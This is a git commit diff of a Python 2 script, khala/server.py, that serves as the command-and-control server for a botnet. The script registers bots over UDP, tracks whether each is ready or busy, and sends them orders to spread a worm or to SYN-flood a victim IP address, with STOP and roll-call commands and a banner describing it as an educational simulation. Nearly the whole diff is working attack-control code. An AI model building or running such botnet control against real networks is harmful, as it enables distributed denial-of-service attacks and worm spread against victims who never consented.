2aa4fce6ca0cbeb91d03685ad18c454ca37dcd02
Ryan <ryan.shim@gmial.com>
2018-12-06 15:41:16 -0800

    server script working

--- khala/server.py
+++ khala/server.py
@@ -1,20 +1,23 @@
 import socket
 import logging
 import threading
-import time
+import itertools
+import os
 
 PORT = 1337
-
-bots = ['192.168.0.1']
-bot_states = {'192.168.0.1': 1}   # k = bot address, v = bot state
+BOT_STATES = {}   # k = bot address, v = bot state
 
 logging.basicConfig(level=logging.INFO,
         format='%(asctime)s PID:%(process)d %(message)s',
         datefmt='%H:%M:%S',
         filename='./cnc.log')
-        #filename='/tmp/cnc.log')
 logger = logging.getLogger('')
 
+####################
+#                  #
+# SERVER MAIN LOOP #
+#                  #
+####################
 def server_cmd():
     """ Obtains user input and parses the commands to perform botnet
     administrative duty, determine attack properties, etc.
@@ -24,12 +27,13 @@ def server_cmd():
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+    # main server command loop
     while True:
         try:
             user_input = raw_input('\033[1m' + 'khala_botnet$ ' + '\033[0m')
-        except KeyboardInterrupt:
+        except KeyboardInterrupt:   # kill process if kb interrupt
             sock.close()
-            return
+            os.kill(os.getpid(), 9)
 
         tokens = user_input.split(' ')
         command = tokens[0].lower()
@@ -56,72 +60,115 @@ def server_cmd():
 
         elif command == 'exit':
             sock.close()
-            return
+            os.kill(os.getpid(), 9)
         else:
             print("Invalid command. Enter 'help' for options.")
 
+
+############################
+#                          #
+# BOTNET COMMAND FUNCTIONS #
+#                          #
+############################
 def attack_command(s, atck_type=None, victim_ip=None):
     """ Depending on the attack type parameter, spread the worm or perform
     a SYN-FLOOD attack on specified address.
     """
+    global BOT_STATES
+    global PORT
+
     # Validate user input options
     if atck_type != 0 and atck_type != 1:
         print("Invalid attack type. Enter 'help' for options.")
         return
-
     elif atck_type == 1 and victim_ip != None:
-        ip_tokens = victim_ip.split('.')
-
-        if len(ip_tokens) != 4:
-            print("Invalid IPv4 address.")
+        try:
+            socket.inet_aton(victim_ip)
+        except socket.error as error:
+            print("Invalid IPv4 address. Reason: {}".format(error))
             return
-        
-        for octet in ip_tokens: # doesn't check if alphanumeric
-            octet_len = len(octet)
-            if octet_len < 1 or octet_len > 3:
-                print("Invalid IPv4 address.")
-                return
-
     elif atck_type == 1 and not victim_ip:
         print("Input victim address.")
         return
 
+    logger.info("Starting ATCK::{}".format(atck_type))
+
     # Set bot states to READY
-    for addr in bot_states:
-        if bot_states[addr] == 1:
+    for addr in BOT_STATES:
+        if BOT_STATES[addr] == 1:
             s.sendto('STOP', (addr, PORT))
-            print("Sent 'STOP'")
+            print("{} BUSY. Sent STOP message.".format(addr))
+
+    # sleep a little to wait for responses?
 
     if atck_type == 0:
-        for addr in bots:
-            message = "ATCK::{}".format(atck_type)
-            print(message) 
-            s.sendto(message, (addr, PORT))
-            bot_states[addr] = 1 # update bot to busy state
+        print("\nSpreading worm.")
+        for addr in BOT_STATES.keys():
+            if BOT_STATES[addr] == 0:
+                message = "ATCK::{}".format(atck_type)
+                s.sendto(message, (addr, PORT))
+                logger.info("ATCK::0 sent to {}".format(addr))
+                print("Sent ATCK::0 to {}".format(addr))
+
+            s.sendto("ROLL", (addr, PORT))  # Reset bot state
+
+        logger.info("ATCK::0 sending complete.")
     else:
-        for addr in bots:
-            message = "ATCK::{}::{}".format(atck_type, victim_ip)
-            print(message)
-            s.sendto(message, (addr, PORT))
-            bot_states[addr] = 1
+        print("\nSYN-FLOOD to {}".format(victim_ip))
+        for addr in BOT_STATES.keys():
+            if BOT_STATES[addr] == 0:
+                message = "ATCK::{}::{}".format(atck_type, victim_ip)
+                s.sendto(message, (addr, PORT))
+                logger.info("ATCK::1 sent to {}".format(addr))
+                print("Sent ATCK::1 to {}".format(addr))
+
+            s.sendto("ROLL", (addr, PORT))
+
+        logger.info("ATCK::1 sending complete.")
+
 
 def stop_command(s):
     """ Send a 'STOP' message to all enrolled bots and reset states to ready.
     """
-    for addr in bots:
-        if bot_states[addr] == 1:
-            print('STOP')
+    logger.info("Sending STOP")
+    print("Sending STOP to all BUSY bots.")
+    for addr in BOT_STATES.keys():
+        if BOT_STATES[addr] == 1:
             s.sendto('STOP', (addr, PORT))
+            logger.info("Sent STOP to {}".format(addr))
+            print("Sent STOP to {}".format(addr))
+        logger.info("Resetting {} state to READY.".format(addr))
         s.sendto('ROLL', (addr, PORT))  # Reset state to ready
+    print("STOP messages sent.")
+
 
 def roll_command(s):
     """ Check in on status of bots. Sends the bots a ROLL message where they
     respond with their states.
     """
-    for addr in bots:
+    for addr in BOT_STATES.keys():
         s.sendto('ROLL', (addr, PORT))
         print('ROLL sent to {}'.format(addr))
-    #logger.info('All bot statuses updated.')
+    logger.info('All bot statuses updated.')
+
+
+def list_bots():
+    """ List bots characterized by their current state.
+    """
+    bot_count = len(BOT_STATES)
+    ready = []
+    busy = []
+    
+    for addr in BOT_STATES.keys():
+        if BOT_STATES[addr] == 0:
+            ready.append(addr)
+        elif BOT_STATES[addr] == 1:
+            busy.append(addr)
+
+    print("READY ({})\tBUSY ({})".format(len(ready), len(busy)))
+    for bots in itertools.izip_longest(ready, busy, fillvalue=' '):
+        print(bots[0] + "\t" + bots[1])
+
 
 def bot_listener():
     """ Listens on specified port for bot responses, adds bots if not
@@ -131,6 +178,9 @@ def bot_listener():
         2. 'REDY' - Bot state informs server that it's ready for commands.
         3. 'BUSY' - Bot state informs server that it's currently attacking.
     """
+    global BOT_STATES
+    global PORT
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('', PORT))
 
@@ -139,37 +189,23 @@ def bot_listener():
 
         if bot_resp == 'HELO':
             logger.info("Received 'HELO' from: {}".format(client_addr))
-            if client_addr not in bots:
-                bots.append(client_addr)
-                bot_states[cliend_addr] = -1 # sets -1 for unintialized state
+            if client_addr[0] not in BOT_STATES.keys():
+                BOT_STATES[client_addr[0]] = -1 # sets -1 for unintialized state
 
         elif bot_resp == 'REDY':
-            bot_states[client_addr] = 0
+            BOT_STATES[client_addr[0]] = 0
             logger.info("Received 'REDY' from: {}".format(client_addr))
 
         elif bot_resp == 'BUSY':
-            bot_states[client_addr] = 1
+            BOT_STATES[client_addr[0]] = 1
             logger.info("Received 'BUSY' from {}".format(client_addr))
 
-def list_bots():
-    ready = []
-    busy = []
-    bot_count = len(bot_states)
 
-    for addr in bot_states.keys():
-        if bot_states[addr] == 0:
-            ready.append(addr)
-        elif bot_states[addr] == 1:
-            busy.append(addr)
-
-    print(ready)
-    print(busy)
-    print(bot_count)
-
-def server_driver():
-    server_cmd()
-    #threading.Thread(target=bot_listener).start()
-
+########################
+#                      #
+# EXTRANEOUS FUNCTIONS #
+#                      #
+########################
 def print_menu():
     print("""
 \033[1mOPTIONS:\033[0m
@@ -200,14 +236,24 @@ def print_help():
     """)
 
 def print_banner():
-    print(""" ____  __.__           .__           __________        __                 __
+    print("""\033[36m ____  __.__           .__           __________        __                 __
 |    |/ _|  |__ _____  |  | _____    \______   \ _____/  |_  ____   _____/  |_
 |      < |  |  \\\\__  \\ |  | \\__  \\    |    |  _//  _ \\   __\\/    \\_/ __ \\   __\\
 |    |  \|   Y  \/ __ \|  |__/ __ \_  |    |   (  <_> )  | |   |  \  ___/|  |
 |____|__ \___|  (____  /____(____  /  |______  /\____/|__| |___|  /\___  >__|
         \/    \/     \/          \/          \/                 \/     \/
-
+\033[0m
 Simple botnet implementation to simulate distributed SYN-FLOOD attacks for educational purposes only.""")
+
+
+####################
+#                  #
+# DRIVER FUNCTIONS #
+#                  #
+####################
+def server_driver():
+    threading.Thread(target=bot_listener).start()
+    threading.Thread(target=server_cmd).start()
 
 if __name__ == '__main__':
     server_driver()
